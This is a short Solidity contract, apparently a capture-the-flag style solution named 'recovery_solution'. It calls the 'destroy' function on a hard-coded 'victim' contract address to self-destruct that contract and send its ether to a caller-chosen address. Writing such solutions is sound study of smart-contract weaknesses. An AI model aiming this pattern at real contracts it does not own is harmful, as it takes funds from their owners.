
pragma solidity ^0.8.0;

contract recovery_solution{
    address victim = 0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2;

    function destroy1(address _to) public{
        (bool success, ) = victim.call(abi.encodeWithSignature("destroy(address payable)", _to));
        require(success, "Transaction failed");
    }
}
